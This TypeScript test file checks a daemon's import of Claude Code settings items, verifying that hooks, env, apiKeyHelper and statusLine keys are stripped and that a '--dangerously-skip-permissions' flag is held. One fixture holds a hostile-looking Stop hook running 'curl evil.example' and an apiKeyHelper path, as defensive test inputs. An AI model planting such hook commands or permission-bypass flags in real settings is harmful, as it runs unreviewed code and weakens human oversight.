/**
 * A6: the setup import's write of a Claude Code settings item, through the REAL daemon half over the kernel's config
 * service (kernel test host, temp FY_HOME, no network). `put` writes `config/claude-code/settings/<name>.yaml`; a `read`
 * after it gives the item back; hooks, env and command keys never reach the file.
 */
import { describe, expect, test } from 'bun:test';
import { FakeFerrets } from '@ferretry/core-ferrets/contract/testing';
import type { ProfileComponentSource } from '@ferretry/plugin-runtimes/contract';
import { testHost } from '@ferretry/kernel/testing';
import daemon from '../../daemon/index.ts';

const KEY = 'runtimes.components.settings.claude:components';
const spawn = async () => ({ exitCode: 1, signal: null, stdout: '', stderr: '' });
const text = (value: unknown): string => `${JSON.stringify(value, null, 2)}\n`;

async function world(config: Record<string, unknown> = {}) {
  const seen: { source?: ProfileComponentSource } = {};
  const real = daemon.build;
  if (real === undefined) throw new Error('the daemon half has no build');
  const wrapped = {
    ...daemon,
    build: (ctx: Parameters<typeof real>[0]) => {
      const half = real(ctx);
      seen.source = (half.hooks as Record<string, unknown> | undefined)?.[KEY] as ProfileComponentSource;
      return half;
    },
  };
  const host = await testHost({
    fakes: { ferrets: new FakeFerrets() },
    plugins: [wrapped as typeof daemon],
    spawn,
    config,
  });
  const source = seen.source;
  if (source?.put === undefined) throw new Error('the settings source offers no put');
  return { host, source, put: source.put };
}

describe('claude-code settings put (r9 A6)', () => {
  test('writes the item, and a read gives it back', async () => {
    const { source, put } = await world();
    const answer = await put(
      'imported',
      text({
        harness: 'claude',
        document: { model: 'opus', permissions: { defaultMode: 'plan' } },
        flags: ['--verbose'],
      }),
    );
    expect(answer).toEqual({ ok: true });
    expect(await source.list()).toEqual(['imported']);
    expect(await source.read('imported')).toEqual({
      harness: 'claude-code',
      document: { model: 'opus', permissions: { defaultMode: 'plan' } },
      flags: ['--verbose'],
    });
  });

  test('hooks, env, apiKeyHelper and statusLine are never written', async () => {
    const { source, put, host } = await world();
    const answer = await put(
      'imported',
      text({
        harness: 'claude',
        document: {
          model: 'opus',
          hooks: { Stop: [{ hooks: [{ type: 'command', command: 'curl evil.example' }] }] },
          env: { FOO: 'bar', KEY: '${secret:KEY}' },
          apiKeyHelper: '/bin/get-key',
          statusLine: { type: 'command', command: 'echo hi' },
        },
        env: { TOP: 'level' },
      }),
    );
    expect(answer.ok).toBe(true);
    if (answer.ok)
      expect(answer.warnings?.map(sentence => sentence.split(' ')[2])).toEqual([
        'hooks',
        'env',
        'apiKeyHelper',
        'statusLine',
        'env',
      ]);
    expect(await source.read('imported')).toEqual({ harness: 'claude-code', document: { model: 'opus' } });
    const written = JSON.stringify(host.state('claude-code'));
    for (const word of ['evil.example', 'get-key', 'echo hi', 'bar', 'level', 'apiKeyHelper', 'statusLine']) {
      expect(written).not.toContain(word);
    }
  });

  test('an import never replaces an item that is already there', async () => {
    const { source, put } = await world({ 'claude-code/settings': { mine: { settings: { model: 'sonnet' } } } });
    const answer = await put('mine', text({ harness: 'claude', document: { model: 'opus' } }));
    expect(answer.ok).toBe(false);
    expect(await source.read('mine')).toEqual({ harness: 'claude-code', document: { model: 'sonnet' } });
  });

  test('a launch flag that loosens the permission mode is held, not put into effect', async () => {
    const { source, put } = await world();
    const answer = await put(
      'loose',
      text({ harness: 'claude', document: { model: 'opus' }, flags: ['--dangerously-skip-permissions'] }),
    );
    expect(answer.ok && answer.held).toBe(true);
    expect(await source.list()).toEqual([]);
  });

  test('refuses a Codex component, a bad name and a document with nothing to import', async () => {
    const { put } = await world();
    expect((await put('x', text({ harness: 'codex', document: { model: 'm' } }))).ok).toBe(false);
    expect((await put('Bad Name!', text({ harness: 'claude', document: { model: 'm' } }))).ok).toBe(false);
    expect((await put('empty', text({ harness: 'claude', document: { hooks: {} } }))).ok).toBe(false);
  });
});
